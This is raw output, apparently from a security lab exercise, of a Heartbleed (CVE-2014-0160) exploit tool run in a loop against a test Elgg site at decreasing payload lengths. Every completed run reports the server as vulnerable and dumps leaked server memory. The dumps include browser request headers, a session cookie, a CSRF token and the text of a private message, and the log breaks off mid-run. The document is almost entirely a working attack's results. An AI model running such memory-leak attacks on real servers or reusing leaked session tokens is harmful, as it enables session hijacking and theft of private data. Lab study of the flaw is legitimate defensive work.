Starting Heartbleed attack loop...
Running attack with length 15000...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

.:.AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#.........3....**...c.....2.?G
]8gD....e....H,
...6..BM*...9 L.7$..4.ychAq..'...g......%b........?..,....gG..Yi..).w.....~.L.........7%.R....8dH. .v..%...;j.z....)..KQF.Z.".s.{`.gAs.vr..a.H;.G[..S......(O"i..v.)....x.c..Y..W.x.#.......~2d...m..V..**.tR"..eeed..6...p.).9uZ.h..&....J..w(;.D..r...'4....]........q.d*{...BQY.f.5}y...e..UI+..G...Hx..1.e5.+.b
..&
..
.v........#~...V......&.}...UG'0...R...i..=Z.......p%.)lS..m.I.P....h..O..6B.Q.6.....T..&...Z.J....TR@...H...#..i%.|..D-..q......A..*...3Q
....".{..XQ[..D...![.r.V....Ovg.......L....#..Q..?......H..8*HU.......\.1.......A.....E.....U.5~.K..[..9.B......Wv<...4..b.f(.a.......,.g.Q;d"U..H)a.>...U..d5..9..Gr.r
:_D[.7.&.....!...S$.T.q......8h&l9F..].r%.q{W.#..r.2w....a..+>H.0.y?s..1K+Vt....I@F.l..V.....Ka...w..W..T.4S%.Z...{.a...ul..!Js..H)_...eJ.......`l.;%'D...r.......5W..@.P....
.U.|..9..p............d...Q%4Vt4.{n....[z.0-s....7Q...UzP.;.
#/x
...=3.JF..D..5.y.M5j...A.{c.,0.".5k.\$....!.;...}.8H....f.v.m.W........~1.|.J.0.?...o.T.z#I..B&(.h..8j.F.`.e#j7v.C+\......._.~W....._.Z..^@.(H._Ui...1.@\.....m.....~.xH.9.k......@..&r.x.....4....yFs-....H.c.3.K..=..FN.......=k.|.H]..z.(......'.P$...j.......E..0...A.R.b
.{..t..@..z@sCQf...2<..B.a.....6.>....._../.]..o..l|.WB..|O.AQ... ..p..i.@..t.....r.=.\...M.x(.RLj.......Di.....h2.......h2.http/1.1..........#....4....Dh.B......&.E2.@....X....-H.HM.[..3u"L.\x\.M.....!|s...y'p.+..}.q,y...({.%,C.......p6J...l.s([........+Q......m...FSG..P5...z.6..,.gW....q..(*}.F..b..?.V..YHw..O...p......-._?r.C..................l........dA.q.QII.s.`.
......... ..pC....t..X.....>.............c.......N.{.(C.........Q.|...:<...G.w.;.0@y.....l.MN..C\!%..r..6F.*0.....".....C9.j.
..S.......Z.....+.E.f..il.]3.E.\"!1.^.B..^9..
.x..f.t.?....F)S/.O..w.jq.CV....j...sR.7........zz.........
..................................h2.http/1.18...=....z.7..>.

Completed attack with length 15000.
Running attack with length 14500...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

.8.AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#.......e Gecko) Chrome/130.0.0.0 Safari/537.36
sec-ch-ua: "Not?A_Brand";v="99", "Chromium";v="130"
sec-ch-ua-mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://www.heartbleedlabelgg.com/activity
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: Elgg=7olmbqsb40ij2km1n9o8vokge0

.\]..*.......o..flate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: Elgg=7olmbqsb40ij2km1n9o8vokge0

x.y..nj...;....zkm1n9o8vokge0

..-..:.........'.36Z...:...g..p....KIgz....9...PNs...5.. l1.Q...6CA3....G......O*P[X.W.......L...nA.....3l.lJfwc...Xz..<.Q.4.."/.D..L.Y+..:.....s.@.3...;...(.f.v..D`.!...Uz..Ik..|rf.\s.s4....Y9.jZh.M...r e..I.x......%j...&..l[zJtK.,.h....I...#^|4..f....[..............k#2'L....WTM.SQ...v../..v.zV.+......<|..c........U7..%..TP........!.O..a
...QR,.BT@J.Z.p.=.(.z.+
..iu..qwP...)1.#.8.Sh..3.>k.G....|..$~o....a.a.UB<..,....._..IsZ..x.y...q5S.|..8*y..0.ZW..u.........=.@I*![.@
.).c....tp7EAP...Pe%....Fb!.+.^A....|Qg~
.?...J....B..{....w:F>;.;..CLW..i\.pVbKG. |i.>|9g....B.oK..I4=.....b...#......m....l.A.5B.R..#?
@.j...D..._......._...5fU-w\..~..>....x~v.w5.U,.f.aXt..L..NC,..<..L.h.....3...9.p9 ..~)q......vb}.WZ..A.Z(.t.,._I.Z...!..(.(.)}A....ff....$..ESa.....;'...OB.z:k"..vU.,iM.a=ey+.r......V....(P........oj:......#....X....g.6.D...Fp....#X.j,uhN.^.X=..10.O.!.Ec2O.k..~.e.YG......t...(.P.?..t.....j/.v]..DrX... ..99......
...<.{.F.k..+d&aY...u......#........2..1..9....Y!..(U.7V...i2..gU/&<.K[.~.........]DB.....9#/9[$/8.B.
...^%!..1.......]>..q9j.lv..Ah....!l.$.....N........Wu0.4.`.-..)fp.xS...n...X....4Lq.O...x
.%..:..4....2.......[\A.[.
...................Di.....h2.-..........
..c........-....Di.....h2

...............
...
..c.......

Mp.+.}B..m......

Completed attack with length 14500.
Running attack with length 14000...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

.6.AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#.......ke Gecko) Chrome/130.0.0.0 Safari/537.36
sec-ch-ua: "Not?A_Brand";v="99", "Chromium";v="130"
sec-ch-ua-mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://www.heartbleedlabelgg.com/activity
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: Elgg=7olmbqsb40ij2km1n9o8vokge0

,.DC...HA.W_V...
.r.....E...O;Pq.......f~[.F...<..S(}.....I....)...W..i..ra....X..y...[..~..8.i.d~..G2..
K.6$&.......,xdU.d..H..+:.y..&..
.;.v...-@.M...8.....v....oY1......}.....7..[..\.A.JG$.....9.....V.$..LF.RRN.....4...*g.<V....9..6i.e*.gm..g...../....#.o..{.,.wp51k.R.hc.......8bc0U.5&.b;.....+>.b....Y..Yk=k....
...
.@.JM.b.!w+"4#ij....R5.>3y..}...i...,3.D.....g.XW*R|..!....7.9.W.!..9......2.....(......-.v....]e...vmqS..'p..".ro.......h..p.P c....c..2.k?....r.*....fU..|.v*..........W?..
V......rG..le73../V..|^>.h[.....;..1s}..N-.sA,F........@..E.G.y...1xX.'....h..x...*......m3.....Q}.P7........s~.CZT..3k....0f6.b.p..+{.....d6..g..,...a.{.c?...
.]z......N...=....h.i.;...B.X.:..[...`..B.]..e..Lz..Jz".....8.,.<...R&".
..G.q.9$...LpZ...r.g..j....}.9..ov...I...[..x..oF...D...+eak......Z.1>&....\..X...qd...2.!.)|...h.e..i........+*.y......Gr..Y~.....VS.w.3.{z....6.....k.!...UJTk....
.T...n...Y.....d<E.(..'E.7...-LY...V.s|\.L..0.(....0b.x.|v...v.A..t.......d....Z...-`.......... .7...h....r.H..-.......).=.._Y.......
.....................
.......r. u.N....Q.&....b..r.~..x.=.~.k".....c_.pP.q^......0......:5u.!.~"AD37...@9....7..*....*..*.....w..0q.....+.>....O....0..Bo.0@5..-p.']..
.....c..3..lZ.ms...$.x5.KCFn.R.....m?\...A&...............www.heartbleedlabelgg.com.-..................Mx.H...9.X.u....Di.....h2........f*.?u.u./S.O@... .
Fs.EJ..it.XG........$6..=8.aj9w,....}f...Z+9.z

Completed attack with length 14000.
Running attack with length 13500...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

.4.AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#..........g....x&6!.....p<...f.D._.Y(....1._..9...48.....9Fvw........,..!4..&1/R/..HA.l..1..8.O..M\C. tu...)..h....>...-..J.:\|....j...WC.....D..........a.....
...
zzc.................
....................Di.....h2.+...JJ.............www.heartbleedlabelgg.com.......h2.http/1.1.-....................3....zz...c.........6....I...)J.gu.a]..,p.~..a{....9pu....."[1..g5E.eg.....6b..........Y..,).:i..u.....X..n.q8...k..&..Er...]iIJ...$
b.i...=..9)5....Ybw{.w.\..B..2..}...(......p...
ii...$.B..C;...O.pB.TX.F.....b...>.l.\c.2@...?.<....._..N.......J...GS..L'*...8.?.....Uv4...y.
._w..Sz.0......(.vU
....].#...V9.;....Gt...t|........x:k....
.]..R_..E.U.AT."..P.....1...to......$x.s......e.q..a.1x.X.
 .
..4...P.q8dgY..1...
'..Zwx....
...f..F.X...\...Q..7...7..!B&..c..J.._tT..Jo...e.@.7$.Ls....b.d..#...'.56..<.3l.H..qS..)3........lw.z....s.........rt.E..1.A7s.Z,.0..}...K
.I.5
..>....V.<I......O....Z.w"...........[..o......pl...P~XN.p.Q(...dP.t.I).3.d."^.......r..t..I<.'.G.....b#Ks}5.c...y.....k.c.3=V\.Q...|c.8.....`D$..E...._.U....
p1`...K@.q...7(.....E.FA............Z...g...%'DT....K0{>{kD/\...9]+k.........."5..-0....?.2.Vt.K.._.Cll_.W.....|..`..W).1....T......9..q....ZbA*U..!}$.k1.*..P.VM"k'...c.t...a...A.....5.D.G........\h,m..%.@W.Q..S..'sR3d.Q..p....!G....4.j.Y)..:T......S...q....L.x..#p...L.fH....'6f.s..V...X{.i.qZv...V.....#. .#u ..heJ....$P.....E..1...1sS.6..j....,&v.ky].3C...+|...
....4...I..o.D..fI0.=u.).6....(..Q...G.8GP;;.r..BG.4c,.*pr)..$8.Y.........cW....DF./......R.huaW..
s.,.+...b."..T#......|..+....q..... Y..X..P..?.
.SRx'...........h.B.........#....4....Dh.B.............(.f.,9...a,....p=fD~.O..
=.....m.J...A...(...P....{`
9y.X4.......$.........A....
........W..K.I....3..:....5.FN.:..{..y..........!.N.n..pD...k.Y......a..n.}z.Ff%.xbz.. e.....b...V...Z..>....STD'.0%........
-,r.N.Tx..m...3

Completed attack with length 13500.
Running attack with length 13000...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

.2.AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#...........
.......{. t.(._..,.....D(9.%...6..5....$
.......
NE....-..O6....yP..Z..nn".r.....wwu.....5.V.A.......<..........)..B.N9.. .nk..FL..IJ.,85.!
..g.S...H....?qB..*N.M...i.c..U.....Mn..!...........Di.....h2......#....4....Dh.B.............(.f.,9...a,....p=fD~.O..
=.....m.J...A...(...P....{`
9y.X4.......$.........A....
........W..K.I....3..:....5.FN.:..{..y..........!.N.n..pD...k.Y......a..n.}z.Ff%.xbz.. e.....b...V...Z..>....STD'.0%....3.........c...S...r..u.:.W..A9.;7...zdQ.....3u.7(..Aw.......K.....Rt.NF.........:t....V.2.....aw.d .dq!..kLDL..hF..L...W.E....
.d7t..iER.w.).`)*...{..=.Y.ul.....(n[..j.`..=.',.$_......}...6HD..{.`...:a.J.yL.u.....f8s...>.Q......[.:.."x.L....|....W..UA6F`.....o......C.D.Z3..{;b@.4.He.z.[:.U....=..j$.._S?@.?P...QJ..F..0).=.i.l:....@..v....*j..>....9.Vd<....+..+8.4jZ..0..q.f\`a.......O.a.l..\...Q..!s..j....r5..p+Z%..g..Y..S.2..G...@...2..`...wG.\v..}...VdV...~.w(v.@VXJ"...s..~y.-a.C.Z....+\(..=.Qj.T.$.E.[O.K].a`.P.{.Xg...y2.&.XdN|.).rq.."[.L.5.......{(..Ej{.>t.4..eO6.*.X.<..Z...3k3C..#..\k....(.)W...$...@M..A.6.Tea..U.....<#,J..(..2*#..LN......u....
.1=.....&M..).{..>...g...Zw.r..a&^$.tT.....'..ZV..A@.s..8..|....,..C.$.?8.,..C..R.......X1V...........w.J.q.?..)..b.7.b.DK7...M$.....L.<.I..X....g.6.]...}9.P;>.1
.
......l. .Q.:..5P.%.2a.as;D-...i,2.....M.; ?H..P1.w..l<bA...n.u.O..4#....V...e.nAyJ.Vj..........aQ`...er..Y..*..T...a
..~....C.5.q.<...9.......s
..G.P%.V.z1.u.`...h.Z.y..VU.Tn..K..l),.D;*.s..`kT..u.r=.*H....s-S..$.C....W..>.c~W...U..C..!...... .bi....i.F .......Dt'|.z.c..xk..()...0.}l.u;gAHp.Y....|T.?; Of)l...z..e....
."...C......W...s......#j.:lD..-.@f.V`..?.D/E.s...+....>.L...;...E.F.U
a.}.h...m....*.,@m.F... ..".A......u......85.1......6.=6.
...
..c....................b...V...Z..>....STD'.0%.........G.......&.-.....+...............
::c........+J.a..R1.g^..C>.

Completed attack with length 13000.
Running attack with length 12500...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

.0.AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#.......(KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Not?A_Brand";v="99", "Chromium";v="130"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Referer: https://www.heartbleedlabelgg.com/messages/add/33
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: Elgg=7olmbqsb40ij2km1n9o8vokge0

\...D.......F...p, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: Elgg=7olmbqsb40ij2km1n9o8vokge0

__elgg_token=a017028027520a9547a440da6a60c56b&__elgg_ts=1729485922&recipient_guid=40&subject=Another+secrets%21&body=Yes%2C+very+secret+indeed%21.t.0?..n..j...K...T+.|..q..K4<....Z.5.RehF..X).f?w.c>{[P`....I0..5..)U...N.%>..v..EY.[.Z.;..b.b.F]...Y..6...W.a.......u.=..T.|Gd.]t..+..-..v..:..Hq....1.s......
*/..~.s.Q.lU%...V......
..&....pFYL y.4.-..Z.....s-#.-TYWyX:....2..o4.K.JT..Ea!.'...wr..?....R'......R 6M...s.
.e.L<.....>.9.u..e....uuX..Y'..{.J.?.9u...,P..l....@l.B.8...8A..tY4\..Z...zz.BGWX...,..;m...o.......q..2>k;Q.........C.........D.:=..I..mi..L./a.X....k(.P..4P:..,.~>....K..70...._..E. <.Q].g..r.:a....c.@4./..K...5...+
..x..}X3..........z.JA..>......._E....(,..>f..*O+.A9.q.".|./.....C..F2.
S$QPY.........
a5-[.RW.U,..M.N..zu........e.
C'..u......L....73.3.6"$.G....0..../...grvD.u.Y..yS.!C..].ly.U..Y.V..\.].|fS..6...QG...X....|2;0..].|1..n4..FJ.....Gy
.2.......&..X.m.b8.....3..Yv.{5.|CC.&..tW.KO{|.\\.h....Z[M..W..........w...
.._x.q... ....z..."...e.....3......S.T\&.w........+.........Di.....h2.........www.heartbleedlabelgg.com.......h2.http/1.1**....Di.....h2.........www.heartbleedlabelgg.com.+.............ZZz.R....u......m.

Completed attack with length 12500.
Running attack with length 12000...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

...AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#.........M..
.$h....MW..Y?.Yq....../..I'.....]h...hf.QT.c...*....%....4&0.....j4.._.c..+.....%......]..W.m_y..$.56.e.....|X.......f.2.eN3.D;.z;....f......).l..:......;....aLd....v%IX.nD.).p:..:.8F..'c.(.....P
S....*w...^.I....c... r...O..v?.N........
...........................h2.http/1.1.....
...
..c........3.........c.....#....,....!......e..&..hv....,....(.fkHV....R...v.6.3C7...a.Y\..&h.....7gC..R..U...q.TW.A.A.U.......5.d8vYKxQ.....
....
a<_...XX.e.2y0]s|......A.5........`([..".[..*.....?.[.....tz..E@(i....3#~.R....'U..>x.<j'E.g..2o.....3~k.%.;..;.2.'.eC....a.xj
...bU...y.#....+MG..k0u........
...........+E.....yl-_.j....3..g| .....=..:.(....!.'Zz...>.a4.@$R.fz\..(..?.'..|..a.......w....x.k...<B..<k...
......x..... .S..e..k....K~...4E.3T.N.S.:5e$.*e.
e..+...Q...i..i....[,..Ek...6nR)Fz{-..G...X..s<....S.B|..Kw.bp
.;.xBJ.z..J.Yh.....hE.k.B5.....MNf..Q2.AR}..=u...d.rZS.u..5L.h.H..w..i..US.....R.......ZN..]........69@.a..#.[#..H.H.P66.f...J...R....>8.!..P,-......7..C...19h..l..9.e.:..R...k.4l[.N...(.6.|..h....,T..S.:...p..P._."..*.fs[2..i+T.b...Bdc....A....Au.G..{{4.a..f6Rx.@g.......?....\.zz..]_a......N.....l>.......BV.......j.Z.....`rn.H.\5..Z07....%D.TZo?.j"A..0..p.be ..............&...pj.~qP.ga.R...D..H]z...ZM&..._....k|....<<.u.QS..DEg...g...K...r.g..............X.......BH.......C..*...#ST.......o:..eW..KM.3..F.42.$...Xuc.x.A+.:......o'.2gL.u.....J..j}bP.+...Vs.k...Tzj...Qh.H..0.9)..6...=k.......Q.c.2.r.J.J...#n....A....8.u.Y.h..+....f.0k..=....>..1
c.].N..-.0...
2..]...`.k.%...xT......&.....@...8Z...'.R......... ......fi...&n...2.........>..z.R......#....4....Dh.B.............(.f.,9...a,....p=fD~.O..
=.....m.J...A...(...P....{`
9y.X4.......$.........A....
........W..K.I....3..:....5.FN.:..{..y..........!.N.n..pD...k.Y......a..n.}z.Ff%.xbz.. e.....b...V...Z..>....STD'.0%...............h2.http/1.1jj@2S.....%]7.

Completed attack with length 12000.
Running attack with length 11500...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

.,.AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#.......x#."..8......H6..'....v...,.....\~..O.x..?.....c}.i.*...#=.....H..|t.U..
..k...z..k9.QZ.....hr.
."..
R.......b.0...K3)...|....G..q......JE]).p8........9L2?....................www.heartbleedlabelgg.com.......h2.http/1.1........
....................Di.....h2.+...

..............-.....
...
..c........3.........c.......S....yH....vw.|.....r....&CN..K....E3.EB*.N...".o.Y.A."..i.....$.L..w...KN#.{...C.Y.|.5vae
)Wfir.RK........#.h!.Ze...xgF;.AO;..}.....L........;...3...5.ht.&_?.PEi%..% .P.{....H(.S.....$c.0\C#....<.....@..F.r^...'I...759.
.VD..e.l.pv.A...m"'.$l.dsFz3MZ4.....5 ...\.yG....i|w6A...xl...r.>.......i..J6..a]...y|m....;.I9..'%. 8..<z..Q....r.2..(...<.w.......I^O.0.E...N..~.Q!...h....g......&.z....X2.a.?..,....>6...&Ac....r.!..K..6...=.C....k...e......4..zpI~..d..@..#2@..c...U.1..5..5-.$....xp[..Z..\.)<.i....:!.O...TI.8pa,N..........kZW9[E
....YXC.{..._.......KnOS.5..r@YM..U1.k.....Y:..D..Q4....B..'.I.gI!.....Q...........`.o..=.O..#W.. .......yTh#..2...G...j4f.r.J.n.n).!...S..>\...W.wv..m..._....3i..v.j..0..qz |..[.`.wQ...o..<.dl`H.....5..B+2g..9...V{..d.6..zB.:qU;r:..I4C.S.......$....90.K"R
..Qi.w0A......r.}i.v..0R.qG...........#6. rk...Ue......N.Ua.+.F........b..L.7g.l..T....yD,.`.I.D.)x#..i^9.]?..5.......cUtj9D^..j....W. ..'.HA.TSt...1H.M.....mU.[...Ze'O'....*a2..0z.M.....F.+..d..F.a.?...../.......|...0b.$'."..W..].:X.G..%...i..cI...YLa....CF...K ..f..2 w...?.<..%.....%........7w...>'.........hT;.;....G.H.8%7.s....0\]u&.yI.Kee. .C DY.<w.}T.C..gF...\\..d.:..q."t...E.&1.O......SsI~\..F..f.p..{mB......... .&.....!Q......#}f..2......Z|Hn#.#.......o.........#....4....Dh.B.............(.f.,9...a,....p=fD~.O..
=.....m.J...A...(...P....{`
9y.X4.......$.........A....
........W..K.I....3..:....5.FN.:..{..y..........!.N.n..pD...k.Y......a..n.}z.Ff%.xbz.. e.....b...V...Z..>....STD'.0%,..o.J.......lc

Completed attack with length 11500.
Running attack with length 11000...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

.*.AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#.......,C.......p6J...l.s([........+Q......m...FSG..P5...z.6..,.gW....q..(*}.F..b..?.V..YHw..O...p......-._?r.C..................l........dA.q.QII.s.`........
...
::c........3....::...c....fc...mI.^...b.7{xY6.N......=.....t.......Ey....t...d...D..............'.TY.A..*..f5.'..;...[...$...........aa..4..Ns....:z...L:.0g..AU!....m...gm..R..B. .d......xx.....rk...v..5
`..+F.g.[..g.._.)&E...(2.'r(Y...\T..oY......P.%c2<.a....g........
..]..x..k...T.i4..K.4 D.$.,.q..y....bF=........{&.....A..(#}.W_z.8x*j.f./L.....6V.....\..P...e...;..5....)..,f..C.g(.2Z......w.#.....d.,..-.0y{-..].@...ZD.n...fi.n2...)D..e....J.....D*.S...nZ..Y<..!."f..I..t.u8........\FY.../z.bY........O.-5.W..........6%,w.V.ai.#]w...+s\p.......U.a...U.7J\9.........xS..m$)l...l.......n.('.:"nI....&6..<WxB~.2D.......1.#.\.....S.....y....g[.5zN.T'...eJ9......Tw..D...r<...e.R..._..b..n.....K..l..
...g....T......! ......mx....H3G...{C.`..>.......,..;k..zT%E.
..[H`...H.w4..`..1.k.b...e..z...YJ........g.a/.F...$*W\jlR.........O...8.m..c..E...$.pKb>.6.........
..C...A.e(
PbtN0......tK.1>.q6.
>....
p..F.!.y6H....F.u2.$...m.S..a.3..K.c. '....J.{.xo..v...$..E...Q.Yo|.A3..%..u.(.R0j
F7....h.Hm.[.k.s.G.8.g.'@........n.v.].N.q...).@>..Hw.z..DPa.1.?2X.....gQ..G.t-Xs. |t.(q.5.....q`...f.v.#P..wkk@.@...;:..EI.d....E .5..T].{...M.....0.nu...\.x.o.i5U..b.....*.....eedf'=j....jg%.B.v.` ".Y....q......L....G...u`.'..G...Q.....p;46....K...(..9.... +Z)I........V.....@*...pC.#.. *7.
..................................-...........h2.http/1.1Di.....h2.
......... i..k...J.....9.....Q.....r:.&.w-..{t.3.7(.....A...\Tb
.o.9...{.M....E.,6zX.....0.X...TK.9.rA.J.....aC./8.`m....p.BeY.].J).....n..0/b..P-..r........aB%M..2B.g.....s.O.....&....2......dC.>j........ue.o.e..N..l.3]..,....df..o..+...{@H.q+..9F...Z.Gz....&.(.|....K!..N/...-..`.Q..............www.heartbleedlabelgg.comZZW....?.u.\S}...

Completed attack with length 11000.
Running attack with length 10500...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

.).AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#............B...{{.g4v..r.%[..*n..i..L..s`......B*...s..2..3.e..M #vo..}+U........C>Td....c...i....,..M!;Y.m.(....]..\..x..b.A.Hw....X..WK..<9.D..v.'=7.:.\.Bv.h...........h2.http/1.1.................
...
zzc................www.heartbleedlabelgg.com.3....zz...c.....<.
F......."..._....9.Y ...1.!..X.....Ij.T.`.W........#......d...U.....U..ORT......pr.i:.)e.W..|..........H/z.kk..$..2..........(......Gg.........%.c.H...."U.F..g.....N...^.l.2}.)T.!...*..<.k.d...z_.z/..o.&.S.....5.DB.!..@l7P..f#.@.... ;.3^S:t.1v...O....b8+./..8.{.6je...W......9.....X..w[&.....:G.X.....HB...d.(...I.ZZ1Z..5...}.J....H:..q.....^.:.....'.T. .({Z@<.q...H...Z.z)$....../T...k>........ xvEp..7c..,
9 ..)1C .
p...c.&.:....{..lB....Z..(..I...!.m..........9
<..............e9.....fL...53q.p..xC.R4t....h....1]g...24..F.Hw....<.L.K;A.^
.o.8..K.h[.A.[...P...."...(4.Uz...;K;Q|#.'...4.[`..*..R..M..p..i...g......e..u..c.N.&..+.."...........]I...F'.RMW.W..4..}V.0.........k.0..LH......Ev.8E..M......qX..q4O.D....s.o7...h_ju.$\H<..l...B..M...Yi}z@.T.*/T...B...'.8.0o.....|..SA.O=.~.4..4i..a.:./y9RK(....e3.....u.X<&{..\2..._.).......jG..7......../..N..$c.S......a..%.'J@:....._/...u..c..;.!.
..].....&T...V&.Tq
H!.p.L'...M.P^..;.z.6:...O....t.[p..w.P.>.xNy.{....&.z............0=7........8.....i...K}..T.
k..f.../E8...[....9....%u.D9.....o....C/ ..M...
........Q.:jAJ0.W(...'w....j[.?..BF.
u`.@#..w......W..A.$...N3..Z.........f6..RJ.o..I.6....6..H.G5..,...k.Ur.D..s...w+..}.......&h@.Y$..X.........$..Z...i..... ...W.g.a.x.'qZa..c..{i.3..g....=.+..............-.........Di.....h2.#....4....Dh.B......&.E2.@....X....-H.HM.[..3u"L.\x\.M.....!|s...y'p.+..}.q,y...({.%,C.......p6J...l.s([........+Q......m...FSG..P5...z.6..,.gW....q..(*}.F..b..?.V..YHw..O...p......-._?r.C..................l........dA.q.QII.s.`.
....................

....[..q.:...x8.%.i..O..[.I..<zz@..........P.H0*

Completed attack with length 10500.
Running attack with length 10000...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
